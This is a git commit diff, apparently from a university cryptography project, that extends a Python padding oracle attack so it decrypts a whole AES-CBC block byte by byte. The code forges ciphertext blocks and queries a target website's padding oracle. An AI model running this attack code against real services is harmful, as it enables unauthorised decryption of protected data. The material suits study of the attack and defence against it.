853d26d4e50f93172eacb98cbc1033d3981340b7
Konrad <01158980@pw.edu.pl>
2023-05-06 13:48:58 +0200

    single chunk decryption attempts

--- bot-padding-oracle/MainApp/OraclePaddingDecryptor.py
+++ bot-padding-oracle/MainApp/OraclePaddingDecryptor.py
@@ -19,7 +19,7 @@ class OraclePaddingDecryptor(object):
     __AES_BLOCK_SIZE = 16
 
     def __init__(self, ciphertext: str, website: str):
-        self.ciphertbytes = base64.b64decode(ciphertext)
+        self.cipher_bytes = base64.b64decode(ciphertext)
         self.website = website
 
     def decrypt_bytes(self):
@@ -30,28 +30,37 @@ class OraclePaddingDecryptor(object):
 
     def split_ciphertext_into_blocks(self) -> list:
         chunk_list = []
-        lngth = len(self.ciphertbytes)
-        for i in range(0, lngth - 1, self.__AES_BLOCK_SIZE):
-            chunk_list.append(self.ciphertbytes[i:(i + self.__AES_BLOCK_SIZE)])
+        length = len(self.cipher_bytes)
+        for i in range(0, length - 1, self.__AES_BLOCK_SIZE):
+            chunk_list.append(self.cipher_bytes[i:(i + self.__AES_BLOCK_SIZE)])
         return chunk_list
 
     def decrypt_single_chunk(self, chunk_i_minus_1: bytes, chunk_i: bytes):
-        # it's impossible to directly increment a bytes object, so we'll use an integer, increment it and then
-        # convert it to a byte
-        curr_byte = 0
-        chunks = [chunk_i_minus_1, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01',
-                  (b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
-                   int.to_bytes(curr_byte, byteorder='big', length=1))]
-        c_prim = xor(chunks) + chunk_i
-        encoded = base64.b64encode(c_prim)
-        while (result := self.send_request(encoded)) != 'True':
-            print(str(curr_byte) + ': ' + result)
-            curr_byte += 1
-            chunks[2] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + \
-                        int.to_bytes(curr_byte, byteorder='big', length=1)
+        result = b''
+        for i in range(0, self.__AES_BLOCK_SIZE):
+            # it's impossible to directly increment a bytes object, so we'll use an integer, increment it and then
+            # convert it to a byte
+            curr_byte = 0
+            chunks = [chunk_i_minus_1, self.prepare_pkcs7_xor_block(i + 1),
+                      self.prepare_sneaky_bytes(curr_byte, result)]
             c_prim = xor(chunks) + chunk_i
             encoded = base64.b64encode(c_prim)
-        return curr_byte
+            while self.send_request(encoded) != 'True':
+                curr_byte += 1
+                chunks[2] = self.prepare_sneaky_bytes(curr_byte, result)
+                c_prim = xor(chunks) + chunk_i
+                encoded = base64.b64encode(c_prim)
+            result += int.to_bytes(curr_byte, byteorder='big', length=1)
+        return result
+
+    def prepare_pkcs7_xor_block(self, value: int) -> bytes:
+        if value < 1 or value > 16:
+            raise ValueError("AES PKCS7 padding consists of bytes with value from 1 to 16")
+        return (self.__AES_BLOCK_SIZE - value) * b'\x00' + value * int.to_bytes(value, byteorder='big', length=1)
+
+    def prepare_sneaky_bytes(self, curr_byte: int, curr_result: bytes) -> bytes:
+        return (self.__AES_BLOCK_SIZE - len(curr_result) - 1) * b'\x00' +\
+            int.to_bytes(curr_byte, byteorder='big', length=1) + curr_result
 
     def send_request(self, data: bytes) -> str:
         client = ServerClient(self.website)
